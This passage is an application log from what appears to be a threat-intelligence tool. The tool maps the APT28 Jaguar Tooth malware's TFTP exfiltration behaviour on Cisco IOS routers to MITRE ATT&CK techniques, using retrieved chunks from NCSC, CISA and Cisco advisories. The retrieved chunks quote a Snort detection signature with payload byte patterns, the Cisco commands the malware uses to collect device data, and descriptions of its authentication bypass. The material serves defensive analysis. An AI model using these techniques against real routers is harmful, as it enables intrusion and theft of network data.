volume of attacks against aging networking appliances and software across all vendors.')]
[2025-04-08 17:47:26,378 INFO] ++ Pre-conditions computed for action: Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol as used by the malware using 9 documents:
[Document(id='a9b66a24-df7c-4186-9e83-209a80f9824f', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='T1083  File and Directory \nDiscovery  Jaguar Tooth enumerates the \nlocal flash filesystem by utilising \na Cisco IOS CLI command.\n\nT1016  System Network \nConfiguration Discovery  Jaguar Tooth utilises several \nCisco IOS CLI commands to \ndiscover the system network \nconfiguration.'), Document(id='8c211639-4e6c-4846-9e3a-11af6b76f5f9', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='Rule type  Snort  \nalert udp  any 161 -> any 161 (msg:"Jaguar Tooth payload deployment"; \\ \n                content:"|2b 06 01 04 01 09 09 5f 01 02 04 01 03|"; \\ \n                content:"AAAAAAAAAAAAAAAAAAAAAAAAAAAAdisa"; distance:1; \nwithin:32; fast_pattern; \\ \n                sid:23041 8004; rev:1; classtype:misc -attack;\\ \n    metadata:date 2023 -04-18;)  \n \n \nDescription  This signature detects the Jaguar Tooth payload patch deployment.'), Document(id='949f0be8-1a20-429a-a064-96058d815fd5', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='Detection  \nRules and signatures  \nDescription  This signature detects the Jaguar Tooth Cisco IOS malware .\n\nIt looks for the \nprocess name, two of the hard -coded commands , and code calling two Cisco \nIOS functions.'), Document(id='7ce50e75-f4d6-4e1e-acdb-a0efddbf862b', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='Tactic  ID Technique  Procedure  \nDefense Evasion  T1556  Modify Authentication \nProcess  Jaguar Tooth patches two \nauthentication functions to grant \naccess to local accounts for \nTelnet and physical sessions, \nwithout chec king the provided \npassword.\n\nT1601.001  Modify System Image : \nPatch System Image  Jaguar Tooth patches the \nsystem image in memory to \nenable a user authentication \nbypass.'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='Initial Access  T1190  Exploit Public -Facing \nApplication  Jaguar Tooth is deployed  via an \nSNMP exploit which grant s \nremote code execution and \nwrite -access to the target \noperating syste m. \n \nExfiltration  T1048.003  Exfiltration Over \nAlternative Protocol :  \nExfiltration Over \nUnencrypted Non -C2 \nProtocol  \n Jaguar Tooth exfiltrates \ncollected device information  over \nTFTP.'), Document(metadata={'source': './documents\\other\\apt28-exploits-known-vulnerability-to-carry-out-reconnaissance-and-deploy-malware-on-cisco-routers.pdf'}, page_content='The actor obtained this device information by executing a number of Command Line \nInterface (CLI) commands via the malware.\n\nIt includes discovery of other devices on the network by querying the Address Resolution Protocol (ARP) table to obtain MAC addresses .'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='Device information exfiltration  \nJaguar Tooth collects and exfiltrates a variety of device information which is gathered using the \nfollowing Cisco IOS Command Line Interface (CLI) commands:  \n• show running -config \n• show version  \n• show ip interface brief  \n• show arp  \n• show cdp neighbors  \n• show start  \n• show ip route  \n• show flash  \n \nSpecifically, Jaguar Tooth e xecutes the following shortened Cisco IOS CLI and Tcl commands, \nexfiltrating the information over TFTP  using the redirect , i.e.'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='• Collects device information and exfiltrates over T rivial File Transfer Protocol (TFTP) .\n\n• Enables unauthenticated  backdoor access .\n\n• It is d eployed and executed via exploitation of the patched  Simple Network Management \nProtocol (SNMP) vulnerability  CVE-2017 -6742 .'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='T1020  Automated Exfiltration  Jaguar Tooth contains a hard -\ncoded list of Cisco IOS CLI and \nTcl commands which are \nautomatically executed and the \nresults exfiltrated  over TFTP .\n\nCollection  T1119  Automated Collection  Jaguar Tooth contains a hard -\ncoded list of Cisco IOS CLI and \nTcl commands which are \nautomatically executed and the \nresults exfiltrated over  TFTP.')]
[2025-04-08 17:47:38,545 INFO] ++ Post-conditions computed for action: Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol as used by the malware using 9 documents:
[Document(id='a9b66a24-df7c-4186-9e83-209a80f9824f', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='T1083  File and Directory \nDiscovery  Jaguar Tooth enumerates the \nlocal flash filesystem by utilising \na Cisco IOS CLI command.\n\nT1016  System Network \nConfiguration Discovery  Jaguar Tooth utilises several \nCisco IOS CLI commands to \ndiscover the system network \nconfiguration.'), Document(id='a39b3687-9747-4484-a6fa-457580873676', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='It has been observed being deployed and \nexecuted via exploitation of the patched SNMP vulnerability  CVE-2017 -6742.\n\nMalware details  \nMetadata  \nJaguar Tooth is non -persistent and deployed at various non -contiguous addr esses within Cisco IOS \nmemory .\n\nThe code and data ha ve been extracted from network traffic and a s such there is  no \nstandard metadata for this malware to include .'), Document(id='8c211639-4e6c-4846-9e3a-11af6b76f5f9', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='Rule type  Snort  \nalert udp  any 161 -> any 161 (msg:"Jaguar Tooth payload deployment"; \\ \n                content:"|2b 06 01 04 01 09 09 5f 01 02 04 01 03|"; \\ \n                content:"AAAAAAAAAAAAAAAAAAAAAAAAAAAAdisa"; distance:1; \nwithin:32; fast_pattern; \\ \n                sid:23041 8004; rev:1; classtype:misc -attack;\\ \n    metadata:date 2023 -04-18;)  \n \n \nDescription  This signature detects the Jaguar Tooth payload patch deployment.'), Document(id='949f0be8-1a20-429a-a064-96058d815fd5', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='Detection  \nRules and signatures  \nDescription  This signature detects the Jaguar Tooth Cisco IOS malware .\n\nIt looks for the \nprocess name, two of the hard -coded commands , and code calling two Cisco \nIOS functions.'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='Initial Access  T1190  Exploit Public -Facing \nApplication  Jaguar Tooth is deployed  via an \nSNMP exploit which grant s \nremote code execution and \nwrite -access to the target \noperating syste m. \n \nExfiltration  T1048.003  Exfiltration Over \nAlternative Protocol :  \nExfiltration Over \nUnencrypted Non -C2 \nProtocol  \n Jaguar Tooth exfiltrates \ncollected device information  over \nTFTP.'), Document(metadata={'source': './documents\\other\\apt28-exploits-known-vulnerability-to-carry-out-reconnaissance-and-deploy-malware-on-cisco-routers.pdf'}, page_content='The actor obtained this device information by executing a number of Command Line \nInterface (CLI) commands via the malware.\n\nIt includes discovery of other devices on the network by querying the Address Resolution Protocol (ARP) table to obtain MAC addresses .'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='Device information exfiltration  \nJaguar Tooth collects and exfiltrates a variety of device information which is gathered using the \nfollowing Cisco IOS Command Line Interface (CLI) commands:  \n• show running -config \n• show version  \n• show ip interface brief  \n• show arp  \n• show cdp neighbors  \n• show start  \n• show ip route  \n• show flash  \n \nSpecifically, Jaguar Tooth e xecutes the following shortened Cisco IOS CLI and Tcl commands, \nexfiltrating the information over TFTP  using the redirect , i.e.'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='• Collects device information and exfiltrates over T rivial File Transfer Protocol (TFTP) .\n\n• Enables unauthenticated  backdoor access .\n\n• It is d eployed and executed via exploitation of the patched  Simple Network Management \nProtocol (SNMP) vulnerability  CVE-2017 -6742 .'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='T1020  Automated Exfiltration  Jaguar Tooth contains a hard -\ncoded list of Cisco IOS CLI and \nTcl commands which are \nautomatically executed and the \nresults exfiltrated  over TFTP .\n\nCollection  T1119  Automated Collection  Jaguar Tooth contains a hard -\ncoded list of Cisco IOS CLI and \nTcl commands which are \nautomatically executed and the \nresults exfiltrated over  TFTP.')]
[2025-04-08 17:47:41,650 INFO] ++ Indicators computed for action: Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol as used by the malware. The indicators are:
['The malware utilizes UDP for communication.', 'The malware communicates over unencrypted channels.']
[2025-04-08 17:48:27,010 INFO] + Processing action: Automated Exfiltration as used by the malware
[2025-04-08 17:48:27,240 INFO] ++ Embedding computed for: Automated Exfiltration as used by the malware. The vector has shape: (384,)
[2025-04-08 17:48:27,372 INFO] ++ Similarity between [Automated Exfiltration as used by the malware] and [automated exfiltration]: tensor([[0.5551]])
[2025-04-08 17:48:27,557 INFO] ++ Similarity between [Automated Exfiltration as used by the malware] and [automated exfiltration: traffic duplication]: tensor([[0.4899]])
[2025-04-08 17:48:27,801 INFO] ++ Similarity between [Automated Exfiltration as used by the malware] and [data transfer size limits]: tensor([[0.3028]])
[2025-04-08 17:48:27,964 INFO] ++ Similarity between [Automated Exfiltration as used by the malware] and [exfiltration over alternative protocol]: tensor([[0.5246]])
[2025-04-08 17:48:28,137 INFO] ++ Similarity between [Automated Exfiltration as used by the malware] and [exfiltration over alternative protocol: exfiltration over symmetric encrypted non-c2 protocol]: tensor([[0.4829]])
[2025-04-08 17:48:28,260 INFO] ++ Similarity between [Automated Exfiltration as used by the malware] and [exfiltration over alternative protocol: exfiltration over asymmetric encrypted non-c2 protocol]: tensor([[0.4876]])
[2025-04-08 17:48:28,354 INFO] ++ Similarity between [Automated Exfiltration as used by the malware] and [exfiltration over alternative protocol: exfiltration over unencrypted non-c2 protocol]: tensor([[0.5088]])
[2025-04-08 17:48:28,443 INFO] ++ Similarity between [Automated Exfiltration as used by the malware] and [exfiltration over c2 channel]: tensor([[0.4996]])
[2025-04-08 17:48:28,534 INFO] ++ Similarity between [Automated Exfiltration as used by the malware] and [exfiltration over other network medium]: tensor([[0.4934]])
[2025-04-08 17:48:28,638 INFO] ++ Similarity between [Automated Exfiltration as used by the malware] and [exfiltration over other network medium: exfiltration over bluetooth]: tensor([[0.5160]])
[2025-04-08 17:48:28,786 INFO] ++ Similarity between [Automated Exfiltration as used by the malware] and [exfiltration over physical medium]: tensor([[0.3574]])
[2025-04-08 17:48:28,920 INFO] ++ Similarity between [Automated Exfiltration as used by the malware] and [exfiltration over physical medium: exfiltration over usb]: tensor([[0.3677]])
[2025-04-08 17:48:29,021 INFO] ++ Similarity between [Automated Exfiltration as used by the malware] and [exfiltration over web service]: tensor([[0.4036]])
[2025-04-08 17:48:29,149 INFO] ++ Similarity between [Automated Exfiltration as used by the malware] and [exfiltration over web service: exfiltration to code repository]: tensor([[0.3636]])
[2025-04-08 17:48:29,259 INFO] ++ Similarity between [Automated Exfiltration as used by the malware] and [exfiltration over web service: exfiltration to cloud storage]: tensor([[0.3748]])
[2025-04-08 17:48:29,340 INFO] ++ Similarity between [Automated Exfiltration as used by the malware] and [exfiltration over web service: exfiltration to text storage sites]: tensor([[0.4648]])
[2025-04-08 17:48:29,544 INFO] ++ Similarity between [Automated Exfiltration as used by the malware] and [exfiltration over web service: exfiltration over webhook]: tensor([[0.3442]])
[2025-04-08 17:48:29,693 INFO] ++ Similarity between [Automated Exfiltration as used by the malware] and [scheduled transfer]: tensor([[0.4163]])
[2025-04-08 17:48:29,844 INFO] ++ Similarity between [Automated Exfiltration as used by the malware] and [transfer data to cloud account]: tensor([[0.1778]])
[2025-04-08 17:48:29,849 INFO] ++ Scores: [('automated exfiltration', tensor([[0.5551]])), ('exfiltration over alternative protocol', tensor([[0.5246]])), ('exfiltration over other network medium: exfiltration over bluetooth', tensor([[0.5160]])), ('exfiltration over alternative protocol: exfiltration over unencrypted non-c2 protocol', tensor([[0.5088]])), ('exfiltration over c2 channel', tensor([[0.4996]]))]
[2025-04-08 17:48:29,849 INFO] ++ Similar techniques found:
['automated exfiltration', 'exfiltration over alternative protocol', 'exfiltration over other network medium: exfiltration over bluetooth', 'exfiltration over alternative protocol: exfiltration over unencrypted non-c2 protocol', 'exfiltration over c2 channel']
[2025-04-08 17:48:29,849 INFO] ++ Querying the QA model for action Automated Exfiltration as used by the malware with the following context:
automated exfiltration
exfiltration over alternative protocol
exfiltration over other network medium: exfiltration over bluetooth
exfiltration over alternative protocol: exfiltration over unencrypted non-c2 protocol
exfiltration over c2 channel
[2025-04-08 17:48:30,657 INFO] ++ QA suggested technique: automated exfiltration
[2025-04-08 17:48:30,658 INFO] ++ Selected technique: automated exfiltration
[2025-04-08 17:48:34,221 INFO] ++ Refining the action: Automated Exfiltration as used by the malware using 9 documents:
[Document(id='8c211639-4e6c-4846-9e3a-11af6b76f5f9', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='Rule type  Snort  \nalert udp  any 161 -> any 161 (msg:"Jaguar Tooth payload deployment"; \\ \n                content:"|2b 06 01 04 01 09 09 5f 01 02 04 01 03|"; \\ \n                content:"AAAAAAAAAAAAAAAAAAAAAAAAAAAAdisa"; distance:1; \nwithin:32; fast_pattern; \\ \n                sid:23041 8004; rev:1; classtype:misc -attack;\\ \n    metadata:date 2023 -04-18;)  \n \n \nDescription  This signature detects the Jaguar Tooth payload patch deployment.'), Document(id='a9b66a24-df7c-4186-9e83-209a80f9824f', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='T1083  File and Directory \nDiscovery  Jaguar Tooth enumerates the \nlocal flash filesystem by utilising \na Cisco IOS CLI command.\n\nT1016  System Network \nConfiguration Discovery  Jaguar Tooth utilises several \nCisco IOS CLI commands to \ndiscover the system network \nconfiguration.'), Document(id='949f0be8-1a20-429a-a064-96058d815fd5', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='Detection  \nRules and signatures  \nDescription  This signature detects the Jaguar Tooth Cisco IOS malware .\n\nIt looks for the \nprocess name, two of the hard -coded commands , and code calling two Cisco \nIOS functions.'), Document(id='9f0df71b-f594-455a-8dd0-8e20bde92d87', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='MITRE ATT&CK® \nThis report has been compiled with respect to the MITRE ATT&CK® framework, a globally accessible \nknowledge base of adversary tactics and techniques based on real -world observations.'), Document(metadata={'source': './documents\\other\\SNMP Remote Code Execution Vulnerabilities in Cisco IOS and IOS XE Software - Cisco.html'}, page_content='Added comments to the Workaround configuration commands to document which exclusions tie to the vulnerable MIBs.Vulnerable Products, WorkaroundsInterim2017-JUL-031.0Initial public release.—Interim2017-JUN-29Show LessLegal DisclaimerTHIS DOCUMENT IS PROVIDED ON AN "AS IS" BASIS AND DOES NOT IMPLY ANY KIND OF GUARANTEE OR WARRANTY, INCLUDING THE WARRANTIES OF MERCHANTABILITY OR FITNESS FOR A PARTICULAR USE.'), Document(metadata={'source': './documents\\other\\Threat Actors Exploiting SNMP Vulnerabilities in Cisco Routers - Cisco Blogs.html'}, page_content='You can read their findings and recommendations in theira blog postalso out today.Infrastructure devices are critical components of any organization’s IT infrastructure.\n\nThese devices are often the first line of defense against cyber-attacks and can help prevent unauthorized access to your network.'), Document(metadata={'source': './documents\\other\\APT28 Exploits Known Vulnerability to Carry Out Reconnaissance and Deploy Malware on Cisco Routers _ CISA.html'}, page_content="This vulnerability was first announced by Cisco on 29 June 2017, and patched software was made available.Cisco's published advisory provided workarounds, such as limiting access to SNMP from trusted hosts only, or by disabling a number of SNMP Management Information bases (MIBs).Malware DeploymentFor some of the targeted devices, APT28 actors used an SNMP exploit to deploy malware, as detailed in the NCSC’sJaguar Tooth Malware Analysis Report."), Document(metadata={'source': './documents\\other\\APT28 Exploits Known Vulnerability to Carry Out Reconnaissance and Deploy Malware on Cisco Routers _ CISA.html'}, page_content='Further detail of how this was achieved in available in the MITRE ATT&CK section of the Jaguar Tooth MAR.ConclusionAPT28 has been known to access vulnerable routers by using default and weak SNMP community strings, and by exploiting CVE-2017-6742 (Cisco Bug ID: CSCve54313) as published by Cisco.TTPs in this advisory may still be used against vulnerable Cisco devices.'), Document(metadata={'source': './documents\\other\\apt28-exploits-known-vulnerability-to-carry-out-reconnaissance-and-deploy-malware-on-cisco-routers.pdf'}, page_content='Further detail of how \nthis was achieved in \navailable in the \nMITRE ATT&CK section  of the Jaguar Tooth \nMAR.\n\nConclusion  \n \nAPT28 has been known to access vulnerable routers by using default and weak \nSNMP community strings, and by exploiting CVE -2017- 6742 (Cisco Bug ID: \nCSCve54313) as published by Cisco.\n\nTTPs in this advisory may still be used against vulnerable Cisco devices.')]
[2025-04-08 17:48:59,138 INFO] ++ Pre-conditions computed for action: Automated Exfiltration as used by the malware using 8 documents:
[Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='T1083  File and Directory \nDiscovery  Jaguar Tooth enumerates the \nlocal flash filesystem by utilising \na Cisco IOS CLI command.\n\nT1016  System Network \nConfiguration Discovery  Jaguar Tooth utilises several \nCisco IOS CLI commands to \ndiscover the system network \nconfiguration.'), Document(id='949f0be8-1a20-429a-a064-96058d815fd5', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='Detection  \nRules and signatures  \nDescription  This signature detects the Jaguar Tooth Cisco IOS malware .\n\nIt looks for the \nprocess name, two of the hard -coded commands , and code calling two Cisco \nIOS functions.'), Document(id='8c211639-4e6c-4846-9e3a-11af6b76f5f9', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='Rule type  Snort  \nalert udp  any 161 -> any 161 (msg:"Jaguar Tooth payload deployment"; \\ \n                content:"|2b 06 01 04 01 09 09 5f 01 02 04 01 03|"; \\ \n                content:"AAAAAAAAAAAAAAAAAAAAAAAAAAAAdisa"; distance:1; \nwithin:32; fast_pattern; \\ \n                sid:23041 8004; rev:1; classtype:misc -attack;\\ \n    metadata:date 2023 -04-18;)  \n \n \nDescription  This signature detects the Jaguar Tooth payload patch deployment.'), Document(id='7ce50e75-f4d6-4e1e-acdb-a0efddbf862b', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='Tactic  ID Technique  Procedure  \nDefense Evasion  T1556  Modify Authentication \nProcess  Jaguar Tooth patches two \nauthentication functions to grant \naccess to local accounts for \nTelnet and physical sessions, \nwithout chec king the provided \npassword.\n\nT1601.001  Modify System Image : \nPatch System Image  Jaguar Tooth patches the \nsystem image in memory to \nenable a user authentication \nbypass.'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='T1020  Automated Exfiltration  Jaguar Tooth contains a hard -\ncoded list of Cisco IOS CLI and \nTcl commands which are \nautomatically executed and the \nresults exfiltrated  over TFTP .\n\nCollection  T1119  Automated Collection  Jaguar Tooth contains a hard -\ncoded list of Cisco IOS CLI and \nTcl commands which are \nautomatically executed and the \nresults exfiltrated over  TFTP.'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='Device information exfiltration  \nJaguar Tooth collects and exfiltrates a variety of device information which is gathered using the \nfollowing Cisco IOS Command Line Interface (CLI) commands:  \n• show running -config \n• show version  \n• show ip interface brief  \n• show arp  \n• show cdp neighbors  \n• show start  \n• show ip route  \n• show flash  \n \nSpecifically, Jaguar Tooth e xecutes the following shortened Cisco IOS CLI and Tcl commands, \nexfiltrating the information over TFTP  using the redirect , i.e.'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='Payload Execution  \nOnce written into memory, Jaguar Tooth payloads are executed by overflowing the return address of \nthe vulnerable function with their location in memory.\n\nConclusion  \nJaguar Tooth is non -persistent malware that targets Cisco IOS routers .\n\nCapability includ es automated \ndevice information collection that is exfiltrated over TFTP and unauthenticated backdoor access.'), Document(metadata={'source': './documents\\other\\apt28-exploits-known-vulnerability-to-carry-out-reconnaissance-and-deploy-malware-on-cisco-routers.pdf'}, page_content='The actor obtained this device information by executing a number of Command Line \nInterface (CLI) commands via the malware.\n\nIt includes discovery of other devices on the network by querying the Address Resolution Protocol (ARP) table to obtain MAC addresses .')]
[2025-04-08 17:49:11,595 INFO] ++ Post-conditions computed for action: Automated Exfiltration as used by the malware using 8 documents:
[Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='T1083  File and Directory \nDiscovery  Jaguar Tooth enumerates the \nlocal flash filesystem by utilising \na Cisco IOS CLI command.\n\nT1016  System Network \nConfiguration Discovery  Jaguar Tooth utilises several \nCisco IOS CLI commands to \ndiscover the system network \nconfiguration.'), Document(id='949f0be8-1a20-429a-a064-96058d815fd5', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='Detection  \nRules and signatures  \nDescription  This signature detects the Jaguar Tooth Cisco IOS malware .\n\nIt looks for the \nprocess name, two of the hard -coded commands , and code calling two Cisco \nIOS functions.'), Document(id='8c211639-4e6c-4846-9e3a-11af6b76f5f9', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='Rule type  Snort  \nalert udp  any 161 -> any 161 (msg:"Jaguar Tooth payload deployment"; \\ \n                content:"|2b 06 01 04 01 09 09 5f 01 02 04 01 03|"; \\ \n                content:"AAAAAAAAAAAAAAAAAAAAAAAAAAAAdisa"; distance:1; \nwithin:32; fast_pattern; \\ \n                sid:23041 8004; rev:1; classtype:misc -attack;\\ \n    metadata:date 2023 -04-18;)  \n \n \nDescription  This signature detects the Jaguar Tooth payload patch deployment.'), Document(id='a39b3687-9747-4484-a6fa-457580873676', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='It has been observed being deployed and \nexecuted via exploitation of the patched SNMP vulnerability  CVE-2017 -6742.\n\nMalware details  \nMetadata  \nJaguar Tooth is non -persistent and deployed at various non -contiguous addr esses within Cisco IOS \nmemory .\n\nThe code and data ha ve been extracted from network traffic and a s such there is  no \nstandard metadata for this malware to include .'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='T1020  Automated Exfiltration  Jaguar Tooth contains a hard -\ncoded list of Cisco IOS CLI and \nTcl commands which are \nautomatically executed and the \nresults exfiltrated  over TFTP .\n\nCollection  T1119  Automated Collection  Jaguar Tooth contains a hard -\ncoded list of Cisco IOS CLI and \nTcl commands which are \nautomatically executed and the \nresults exfiltrated over  TFTP.'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='Device information exfiltration  \nJaguar Tooth collects and exfiltrates a variety of device information which is gathered using the \nfollowing Cisco IOS Command Line Interface (CLI) commands:  \n• show running -config \n• show version  \n• show ip interface brief  \n• show arp  \n• show cdp neighbors  \n• show start  \n• show ip route  \n• show flash  \n \nSpecifically, Jaguar Tooth e xecutes the following shortened Cisco IOS CLI and Tcl commands, \nexfiltrating the information over TFTP  using the redirect , i.e.'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='Payload Execution  \nOnce written into memory, Jaguar Tooth payloads are executed by overflowing the return address of \nthe vulnerable function with their location in memory.\n\nConclusion  \nJaguar Tooth is non -persistent malware that targets Cisco IOS routers .\n\nCapability includ es automated \ndevice information collection that is exfiltrated over TFTP and unauthenticated backdoor access.'), Document(metadata={'source': './documents\\other\\apt28-exploits-known-vulnerability-to-carry-out-reconnaissance-and-deploy-malware-on-cisco-routers.pdf'}, page_content='The actor obtained this device information by executing a number of Command Line \nInterface (CLI) commands via the malware.\n\nIt includes discovery of other devices on the network by querying the Address Resolution Protocol (ARP) table to obtain MAC addresses .')]
[2025-04-08 17:49:16,053 INFO] ++ Indicators computed for action: Automated Exfiltration as used by the malware. The indicators are:
['The content contains "| 03   81   60   00   0 8 |".', 'The content contains "| 24   02   00   0 1 |".']
[2025-04-08 17:49:16,181 INFO] ++ Removed pre-condition: 
Jaguar Tooth malware has successfully infected the Cisco IOS router.
, due to similarity with: 
The Cisco IOS router is vulnerable to exploitation by Jaguar Tooth malware.
 (tensor([[0.8904]]))
[2025-04-08 17:49:17,093 INFO] ++ Removed pre-condition: 
The infected Cisco IOS router has network connectivity to the TFTP server.
, due to similarity with: 
A TFTP server is accessible from the infected Cisco IOS router.
 (tensor([[0.9509]]))
[2025-04-08 17:49:54,916 INFO] Created output with 5 milestones
[2025-04-08 17:49:54,917 INFO] Saving output
[2025-04-08 17:49:54,918 INFO] Application finished with output saved
[2025-04-08 17:49:54,918 INFO] Ending time: 2025-04-08 17:49:54
[2025-04-08 17:49:54,919 INFO] Elapsed time: 18.64 minutes
